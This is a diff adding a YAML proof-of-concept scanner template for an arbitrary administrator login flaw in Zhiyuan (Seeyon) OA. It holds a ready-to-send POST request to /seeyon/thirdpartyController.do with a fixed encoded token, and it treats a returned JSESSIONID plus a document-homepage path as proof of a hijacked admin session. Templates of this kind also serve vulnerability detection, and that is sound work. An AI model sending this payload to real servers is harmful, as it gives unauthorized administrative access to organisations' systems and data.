@@ -1,0 +1,18 @@
+id: poc-yaml-zhiyuan-oa-arbitrary-admin-login
+info:
+  name: 致远OA-任意管理员登陆
+  severity: high
+  tags:
+  - 两高一弱
+  - 任意用户登录
+  finger: 致远OA
+requests:
+- method: POST
+  path: /seeyon/thirdpartyController.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+  expression: status_code == 200 && contains(headers, "JSESSIONID") && contains(body,
+    "/seeyon/doc.do?method=docHomepageIndex&docResId=&_isModalDialog=true&openFrom=")
+variables: {}
+transport: http
